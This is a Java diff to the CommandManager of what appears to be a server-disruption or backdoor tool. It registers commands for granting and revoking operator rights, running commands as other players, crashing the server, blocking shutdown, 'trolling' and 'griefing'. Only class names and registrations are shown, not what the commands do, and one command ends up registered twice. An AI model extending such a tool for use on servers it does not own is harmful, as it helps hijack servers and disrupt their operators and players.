@@ -31,8 +31,10 @@ import de.Garkolym.Commands.Server.CommandBlockServerStop;
 import de.Garkolym.Commands.Server.CommandCrash;
 import de.Garkolym.Commands.Server.CommandDEOP;
 import de.Garkolym.Commands.Server.CommandOP;
+import de.Garkolym.Commands.Server.CommandSUDO;
+import de.Garkolym.Commands.Trolling.CommandDemoscreen;
 import de.Garkolym.Commands.Trolling.CommandGlasVirus;
-import de.Garkolym.Commands.Trolling.TrollCreeper;
+import de.Garkolym.Commands.Trolling.CommandTrollCreeper;
 import de.Garkolym.Commands.Trolling.CommandKackRegen;
 
 public class CommandManager {
@@ -46,16 +48,18 @@ public class CommandManager {
 		// Server
 		this.getCommandList().add(new CommandOP());
 		this.getCommandList().add(new CommandDEOP());
+		this.getCommandList().add(new CommandSUDO());
 		this.getCommandList().add(new CommandCrash());
 		this.getCommandList().add(new CommandBlockServerStop());
 		// Trolling
 		this.getCommandList().add(new CommandKackRegen());
 		this.getCommandList().add(new CommandGlasVirus());
 		this.getCommandList().add(new CommandDemoscreen());
+		this.getCommandList().add(new CommandTrollCreeper());
 		// Griefing
 		this.getCommandList().add(new CommandUltraCactus());
 		this.getCommandList().add(new CommandLuftangriff());
-		this.getCommandList().add(new CommandTrollCreeper)
+		this.getCommandList().add(new CommandTrollCreeper());
 		
 	}
 	
